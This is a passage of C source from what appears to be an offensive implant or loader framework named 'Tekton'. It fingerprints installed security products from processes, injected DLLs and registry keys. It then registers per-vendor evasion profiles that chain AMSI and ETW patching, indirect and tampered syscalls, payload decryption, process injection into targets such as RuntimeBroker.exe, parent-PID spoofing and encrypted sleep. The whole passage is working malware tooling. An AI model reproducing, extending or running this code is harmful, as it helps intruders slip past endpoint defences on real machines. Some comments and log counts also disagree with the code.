    { "cytool",                 TEKTON_EDR_CORTEX       },
    { "cyserver",               TEKTON_EDR_CORTEX       },

    /* ESET */
    { "ekrn",                   TEKTON_EDR_ESET         },
    { "egui",                   TEKTON_EDR_ESET         },
    { "eguiproxy",              TEKTON_EDR_ESET         },

    /* Kaspersky */
    { "avp",                    TEKTON_EDR_KASPERSKY    },
    { "avpui",                  TEKTON_EDR_KASPERSKY    },
    { "klnagent",               TEKTON_EDR_KASPERSKY    },

    /* Bitdefender */
    { "bdagent",                TEKTON_EDR_BITDEFENDER  },
    { "bdntwrk",               TEKTON_EDR_BITDEFENDER  },
    { "bdredline",              TEKTON_EDR_BITDEFENDER  },
    { "epintegrationservice",   TEKTON_EDR_BITDEFENDER  },
};

#define PROCESS_MAP_COUNT (sizeof(g_process_map) / sizeof(g_process_map[0]))

/*
 * Known EDR hook DLLs injected into processes.
 */
typedef struct {
    const char*         dll_name;
    TEKTON_EDR_VENDOR   vendor;
} DLL_VENDOR_MAP;

static const DLL_VENDOR_MAP g_dll_map[] = {
    /* CrowdStrike */
    { "csagent",                TEKTON_EDR_CROWDSTRIKE  },

    /* SentinelOne */
    { "intrumecore",            TEKTON_EDR_SENTINELONE  },

    /* Sophos */
    { "sophosnti",              TEKTON_EDR_SOPHOS       },
    { "sophosnti64",            TEKTON_EDR_SOPHOS       },

    /* Carbon Black */
    { "cbdll",                  TEKTON_EDR_CARBON_BLACK },
    { "cbk",                    TEKTON_EDR_CARBON_BLACK },

    /* Elastic */
    { "elastic-endpoint",       TEKTON_EDR_ELASTIC      },

    /* Cortex */
    { "cyinjct",                TEKTON_EDR_CORTEX       },

    /* ESET */
    { "ehdrv",                  TEKTON_EDR_ESET         },

    /* Kaspersky */
    { "klhk",                   TEKTON_EDR_KASPERSKY    },

    /* Bitdefender */
    { "atcuf",                  TEKTON_EDR_BITDEFENDER  },
};

#define DLL_MAP_COUNT (sizeof(g_dll_map) / sizeof(g_dll_map[0]))

/*
 * Case-insensitive substring match for process names.
 * Matches "csfalconservice" against "CsFalconService.exe"
 */
static BOOL proc_name_match(const char* proc, const char* pattern) {
    if (!proc || !pattern) return FALSE;

    /* Strip .exe suffix for comparison */
    char clean[256];
    snprintf(clean, sizeof(clean), "%s", proc);
    size_t len = strlen(clean);
    if (len > 4) {
        char* ext = clean + len - 4;
        if (tolower((unsigned char)ext[0]) == '.' &&
            tolower((unsigned char)ext[1]) == 'e' &&
            tolower((unsigned char)ext[2]) == 'x' &&
            tolower((unsigned char)ext[3]) == 'e') {
            *ext = '\0';
        }
    }

    /* Case-insensitive compare */
    const char* a = clean;
    const char* b = pattern;
    while (*a && *b) {
        if (tolower((unsigned char)*a) != tolower((unsigned char)*b))
            return FALSE;
        a++; b++;
    }
    return (*a == '\0' && *b == '\0');
}

TEKTON_EDR_VENDOR TektonDetectVendor(PTEKTON_CONTEXT ctx) {
    if (!ctx) return TEKTON_EDR_UNKNOWN;

    (void)ctx;  /* ctx provides OS info but detection is OS-level */

#ifdef _WIN32
    /*
     * Method 1: Enumerate running processes via CreateToolhelp32Snapshot.
     * Check each process name against the known EDR process map.
     */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        TLOG_WARN("CreateToolhelp32Snapshot failed: 0x%08lx", GetLastError());
        return TEKTON_EDR_GENERIC;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    TEKTON_EDR_VENDOR detected = TEKTON_EDR_NONE;

    if (Process32First(hSnap, &pe)) {
        do {
            for (DWORD i = 0; i < PROCESS_MAP_COUNT; i++) {
                if (proc_name_match(pe.szExeFile, g_process_map[i].process_name)) {
                    detected = g_process_map[i].vendor;
                    TLOG_INFO("EDR detected via process '%s': %s",
                        pe.szExeFile,
                        TektonVendorToString(detected));
                    CloseHandle(hSnap);
                    return detected;
                }
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);

    /*
     * Method 2: Check loaded DLLs in current process.
     * EDRs inject hook DLLs via KAPC at process creation.
     */
    HANDLE hModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
    if (hModSnap != INVALID_HANDLE_VALUE) {
        MODULEENTRY32 me;
        me.dwSize = sizeof(me);

        if (Module32First(hModSnap, &me)) {
            do {
                for (DWORD i = 0; i < DLL_MAP_COUNT; i++) {
                    /* Partial match on DLL name */
                    char modname[256];
                    snprintf(modname, sizeof(modname), "%s", me.szModule);

                    /* Lowercase for comparison */
                    for (char* p = modname; *p; p++)
                        *p = (char)tolower((unsigned char)*p);

                    if (strstr(modname, g_dll_map[i].dll_name)) {
                        detected = g_dll_map[i].vendor;
                        TLOG_INFO("EDR detected via loaded DLL '%s': %s",
                            me.szModule,
                            TektonVendorToString(detected));
                        CloseHandle(hModSnap);
                        return detected;
                    }
                }
            } while (Module32Next(hModSnap, &me));
        }

        CloseHandle(hModSnap);
    }

    /*
     * Method 3: Check known registry keys.
     */
    typedef struct {
        const char*         key_path;
        TEKTON_EDR_VENDOR   vendor;
    } REG_VENDOR_MAP;

    static const REG_VENDOR_MAP reg_checks[] = {
        { "SOFTWARE\\CrowdStrike\\CFA",                        TEKTON_EDR_CROWDSTRIKE  },
        { "SOFTWARE\\Sentinel Labs\\Sentinel Agent",            TEKTON_EDR_SENTINELONE  },
        { "SOFTWARE\\Microsoft\\Windows Defender",              TEKTON_EDR_DEFENDER     },
        { "SOFTWARE\\Sophos\\Sophos Anti-Virus",                TEKTON_EDR_SOPHOS       },
        { "SOFTWARE\\CarbonBlack\\CB Defense",                  TEKTON_EDR_CARBON_BLACK },
        { "SOFTWARE\\Elastic\\Agent",                           TEKTON_EDR_ELASTIC      },
        { "SOFTWARE\\Palo Alto Networks\\Traps",                TEKTON_EDR_CORTEX       },
        { "SOFTWARE\\ESET\\ESET Security",                      TEKTON_EDR_ESET         },
        { "SOFTWARE\\KasperskyLab",                             TEKTON_EDR_KASPERSKY    },
        { "SOFTWARE\\BitDefender",                              TEKTON_EDR_BITDEFENDER  },
    };

    for (DWORD i = 0; i < sizeof(reg_checks) / sizeof(reg_checks[0]); i++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg_checks[i].key_path,
            0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            detected = reg_checks[i].vendor;
            TLOG_INFO("EDR detected via registry key '%s': %s",
                reg_checks[i].key_path,
                TektonVendorToString(detected));
            return detected;
        }
    }

    if (detected == TEKTON_EDR_NONE) {
        TLOG_INFO("No EDR detected, using NONE profile");
    }

    return detected;

#else
    /* Linux dev build: no EDR detection available */
    TLOG_INFO("Non-Windows build: EDR detection unavailable, returning GENERIC");
    return TEKTON_EDR_GENERIC;
#endif
}

/* ── Auto Profile Selection ──────────────────────────── */

PTEKTON_EDR_PROFILE TektonAutoProfile(PTEKTON_CONTEXT ctx) {
    if (!ctx) return NULL;

    TEKTON_EDR_VENDOR vendor = TektonDetectVendor(ctx);
    PTEKTON_EDR_PROFILE profile = NULL;

    /* Try vendor-specific profile first */
    if (vendor != TEKTON_EDR_UNKNOWN) {
        profile = TektonProfileFindByVendor(vendor);
    }

    /* Fall back to generic if no vendor-specific profile */
    if (!profile && vendor != TEKTON_EDR_GENERIC) {
        profile = TektonProfileFindByVendor(TEKTON_EDR_GENERIC);
    }

    /* Last resort: find any profile */
    if (!profile && g_profile_registry.count > 0) {
        profile = &g_profile_registry.profiles[0];
        TLOG_WARN("No matching profile, using first registered: %s", profile->name);
    }

    if (profile) {
        TLOG_INFO("Auto-selected profile: %s (%s)",
            profile->name, profile->display_name);
    } else {
        TLOG_ERROR("No profiles registered, auto-selection failed");
    }

    return profile;
}

/* ── Built-in Default Profiles ───────────────────────── */

/*
 * Compiled-in minimal profiles for when YAML files are
 * unavailable. These provide basic selections for each
 * supported EDR vendor.
 */

static void builtin_set_stage(
    PTEKTON_EDR_PROFILE     prof,
    TEKTON_STAGE            stage,
    const char*             primary,
    const char*             fb1,
    const char*             fb2,
    BOOL                    required,
    DWORD                   max_risk
) {
    PTEKTON_STAGE_SELECTION s = &prof->stages[stage];
    snprintf(s->primary, sizeof(s->primary), "%s", primary);
    s->required = required;
    s->max_risk = max_risk;
    s->fallback_count = 0;

    if (fb1 && fb1[0]) {
        snprintf(s->fallbacks[s->fallback_count], 64, "%s", fb1);
        s->fallback_count++;
    }
    if (fb2 && fb2[0]) {
        snprintf(s->fallbacks[s->fallback_count], 64, "%s", fb2);
        s->fallback_count++;
    }
}

TEKTON_STATUS TektonProfileLoadDefaults(void) {
    TEKTON_EDR_PROFILE prof;

    /* ── Generic / Unknown EDR ──────────────────────── */
    memset(&prof, 0, sizeof(prof));
    snprintf(prof.name, sizeof(prof.name), "generic");
    snprintf(prof.display_name, sizeof(prof.display_name), "Generic / Unknown EDR");
    snprintf(prof.version, sizeof(prof.version), "1.0");
    prof.vendor = TEKTON_EDR_GENERIC;
    prof.max_total_risk = 150;
    prof.prefer_stealthy = TRUE;
    prof.min_os_build = 14393;
    prof.sleep_interval_ms = 5000;
    prof.sleep_encrypt = TRUE;
    snprintf(prof.inject_target, sizeof(prof.inject_target), "explorer.exe");
    snprintf(prof.ppid_parent, sizeof(prof.ppid_parent), "explorer.exe");

    prof.threat[TEKTON_SURFACE_USER_HOOKS] = TEKTON_THREAT_HIGH;
    prof.threat[TEKTON_SURFACE_KERNEL_CB]  = TEKTON_THREAT_HIGH;
    prof.threat[TEKTON_SURFACE_ETW]        = TEKTON_THREAT_MEDIUM;
    prof.threat[TEKTON_SURFACE_SCANNER]    = TEKTON_THREAT_HIGH;

    builtin_set_stage(&prof, TEKTON_STAGE_FINGERPRINT,   "auto", NULL, NULL, TRUE, 100);
    builtin_set_stage(&prof, TEKTON_STAGE_API_RESOLVE,   "peb_walk", "hash_resolve", "dynamic_resolve", TRUE, 30);
    builtin_set_stage(&prof, TEKTON_STAGE_EVASION_PRE,   "etw_patch", NULL, NULL, FALSE, 30);
    builtin_set_stage(&prof, TEKTON_STAGE_SYSCALL_INIT,  "indirect_syscall", "direct_syscall", NULL, TRUE, 20);
    builtin_set_stage(&prof, TEKTON_STAGE_DECRYPT,       "encrypt_aes", "encrypt_rc4", "encrypt_xor", TRUE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_INJECT,        "inject_apc", "inject_threadless", "inject_callback", TRUE, 30);
    builtin_set_stage(&prof, TEKTON_STAGE_SLEEP_INIT,    "sleep_ekko", "sleep_foliage", NULL, FALSE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_CLEANUP,       "auto", NULL, NULL, FALSE, 100);

    TektonProfileRegister(&prof);

    /* ── No EDR ─────────────────────────────────────── */
    memset(&prof, 0, sizeof(prof));
    snprintf(prof.name, sizeof(prof.name), "no_edr");
    snprintf(prof.display_name, sizeof(prof.display_name), "No EDR Detected");
    snprintf(prof.version, sizeof(prof.version), "1.0");
    prof.vendor = TEKTON_EDR_NONE;
    prof.max_total_risk = 300;
    prof.prefer_stealthy = FALSE;
    prof.min_os_build = 10240;
    prof.sleep_interval_ms = 3000;
    prof.sleep_encrypt = FALSE;
    snprintf(prof.inject_target, sizeof(prof.inject_target), "notepad.exe");
    snprintf(prof.ppid_parent, sizeof(prof.ppid_parent), "explorer.exe");

    prof.threat[TEKTON_SURFACE_SCANNER] = TEKTON_THREAT_MEDIUM;

    builtin_set_stage(&prof, TEKTON_STAGE_FINGERPRINT,   "auto", NULL, NULL, TRUE, 100);
    builtin_set_stage(&prof, TEKTON_STAGE_API_RESOLVE,   "dynamic_resolve", "peb_walk", NULL, TRUE, 50);
    builtin_set_stage(&prof, TEKTON_STAGE_EVASION_PRE,   "amsi_patch", NULL, NULL, FALSE, 40);
    builtin_set_stage(&prof, TEKTON_STAGE_SYSCALL_INIT,  "direct_syscall", "indirect_syscall", NULL, FALSE, 30);
    builtin_set_stage(&prof, TEKTON_STAGE_DECRYPT,       "encrypt_xor", "encrypt_rc4", NULL, TRUE, 50);
    builtin_set_stage(&prof, TEKTON_STAGE_INJECT,        "inject_classic", "inject_apc", "inject_callback", TRUE, 50);
    builtin_set_stage(&prof, TEKTON_STAGE_SLEEP_INIT,    "sleep_ekko", NULL, NULL, FALSE, 30);
    builtin_set_stage(&prof, TEKTON_STAGE_CLEANUP,       "auto", NULL, NULL, FALSE, 100);

    TektonProfileRegister(&prof);

    /* ── CrowdStrike Falcon ─────────────────────────── */
    memset(&prof, 0, sizeof(prof));
    snprintf(prof.name, sizeof(prof.name), "crowdstrike_falcon");
    snprintf(prof.display_name, sizeof(prof.display_name), "CrowdStrike Falcon");
    snprintf(prof.version, sizeof(prof.version), "1.0");
    prof.vendor = TEKTON_EDR_CROWDSTRIKE;
    prof.max_total_risk = 120;
    prof.prefer_stealthy = TRUE;
    prof.require_x64 = TRUE;
    prof.min_os_build = 17134;
    prof.sleep_interval_ms = 10000;
    prof.sleep_encrypt = TRUE;
    snprintf(prof.inject_target, sizeof(prof.inject_target), "RuntimeBroker.exe");
    snprintf(prof.ppid_parent, sizeof(prof.ppid_parent), "svchost.exe");

    prof.threat[TEKTON_SURFACE_USER_HOOKS]  = TEKTON_THREAT_CRITICAL;
    prof.threat[TEKTON_SURFACE_KERNEL_CB]   = TEKTON_THREAT_CRITICAL;
    prof.threat[TEKTON_SURFACE_ETW]         = TEKTON_THREAT_HIGH;
    prof.threat[TEKTON_SURFACE_MINIFILTER]  = TEKTON_THREAT_HIGH;
    prof.threat[TEKTON_SURFACE_SCANNER]     = TEKTON_THREAT_HIGH;
    prof.threat[TEKTON_SURFACE_NIRVANA]     = TEKTON_THREAT_MEDIUM;

    builtin_set_stage(&prof, TEKTON_STAGE_FINGERPRINT,   "auto", NULL, NULL, TRUE, 100);
    builtin_set_stage(&prof, TEKTON_STAGE_API_RESOLVE,   "hash_resolve", "peb_walk", NULL, TRUE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_EVASION_PRE,   "etw_patch", NULL, NULL, TRUE, 20);
    builtin_set_stage(&prof, TEKTON_STAGE_SYSCALL_INIT,  "indirect_syscall", "tampered_syscall", NULL, TRUE, 10);
    builtin_set_stage(&prof, TEKTON_STAGE_DECRYPT,       "encrypt_triple", "encrypt_aes", NULL, TRUE, 10);
    builtin_set_stage(&prof, TEKTON_STAGE_INJECT,        "inject_threadless", "inject_poolparty", "inject_callback", TRUE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_SLEEP_INIT,    "sleep_zilean", "sleep_foliage", "sleep_ekko", FALSE, 10);
    builtin_set_stage(&prof, TEKTON_STAGE_CLEANUP,       "auto", NULL, NULL, FALSE, 100);

    TektonProfileRegister(&prof);

    /* ── Microsoft Defender ──────────────────────────── */
    memset(&prof, 0, sizeof(prof));
    snprintf(prof.name, sizeof(prof.name), "defender");
    snprintf(prof.display_name, sizeof(prof.display_name), "Microsoft Defender");
    snprintf(prof.version, sizeof(prof.version), "1.0");
    prof.vendor = TEKTON_EDR_DEFENDER;
    prof.max_total_risk = 150;
    prof.prefer_stealthy = TRUE;
    prof.min_os_build = 17134;
    prof.sleep_interval_ms = 5000;
    prof.sleep_encrypt = TRUE;
    snprintf(prof.inject_target, sizeof(prof.inject_target), "sihost.exe");
    snprintf(prof.ppid_parent, sizeof(prof.ppid_parent), "explorer.exe");

    prof.threat[TEKTON_SURFACE_ETW]     = TEKTON_THREAT_CRITICAL;
    prof.threat[TEKTON_SURFACE_SCANNER] = TEKTON_THREAT_CRITICAL;
    prof.threat[TEKTON_SURFACE_ELAM]    = TEKTON_THREAT_CRITICAL;

    builtin_set_stage(&prof, TEKTON_STAGE_FINGERPRINT,   "auto", NULL, NULL, TRUE, 100);
    builtin_set_stage(&prof, TEKTON_STAGE_API_RESOLVE,   "peb_walk", "hash_resolve", NULL, TRUE, 25);
    builtin_set_stage(&prof, TEKTON_STAGE_EVASION_PRE,   "amsi_patch", NULL, NULL, TRUE, 25);
    builtin_set_stage(&prof, TEKTON_STAGE_SYSCALL_INIT,  "indirect_syscall", "direct_syscall", NULL, TRUE, 20);
    builtin_set_stage(&prof, TEKTON_STAGE_DECRYPT,       "encrypt_aes", "encrypt_rc4", NULL, TRUE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_INJECT,        "inject_module_stomp", "inject_threadless", "inject_apc", TRUE, 25);
    builtin_set_stage(&prof, TEKTON_STAGE_SLEEP_INIT,    "sleep_ekko", "sleep_foliage", NULL, FALSE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_CLEANUP,       "auto", NULL, NULL, FALSE, 100);

    TektonProfileRegister(&prof);

    /* ── SentinelOne Singularity ─────────────────────── */
    memset(&prof, 0, sizeof(prof));
    snprintf(prof.name, sizeof(prof.name), "sentinelone_singularity");
    snprintf(prof.display_name, sizeof(prof.display_name), "SentinelOne Singularity");
    snprintf(prof.version, sizeof(prof.version), "1.0");
    prof.vendor = TEKTON_EDR_SENTINELONE;
    prof.max_total_risk = 140;
    prof.prefer_stealthy = TRUE;
    prof.require_x64 = TRUE;
    prof.min_os_build = 17134;
    prof.sleep_interval_ms = 8000;
    prof.sleep_encrypt = TRUE;
    snprintf(prof.inject_target, sizeof(prof.inject_target), "explorer.exe");
    snprintf(prof.ppid_parent, sizeof(prof.ppid_parent), "explorer.exe");

    prof.threat[TEKTON_SURFACE_USER_HOOKS]  = TEKTON_THREAT_CRITICAL;
    prof.threat[TEKTON_SURFACE_KERNEL_CB]   = TEKTON_THREAT_HIGH;
    prof.threat[TEKTON_SURFACE_SCANNER]     = TEKTON_THREAT_HIGH;

    builtin_set_stage(&prof, TEKTON_STAGE_FINGERPRINT,   "auto", NULL, NULL, TRUE, 100);
    builtin_set_stage(&prof, TEKTON_STAGE_API_RESOLVE,   "peb_walk", "hash_resolve", NULL, TRUE, 20);
    builtin_set_stage(&prof, TEKTON_STAGE_EVASION_PRE,   "etw_patch", NULL, NULL, FALSE, 25);
    builtin_set_stage(&prof, TEKTON_STAGE_SYSCALL_INIT,  "indirect_syscall", "tampered_syscall", NULL, TRUE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_DECRYPT,       "encrypt_aes", "encrypt_rc4", NULL, TRUE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_INJECT,        "inject_apc", "inject_threadless", "inject_callback", TRUE, 25);
    builtin_set_stage(&prof, TEKTON_STAGE_SLEEP_INIT,    "sleep_foliage", "sleep_zilean", "sleep_ekko", FALSE, 15);
    builtin_set_stage(&prof, TEKTON_STAGE_CLEANUP,       "auto", NULL, NULL, FALSE, 100);

    TektonProfileRegister(&prof);

    TLOG_INFO("Loaded %d built-in default profiles", 4);

    return TEKTON_OK;
}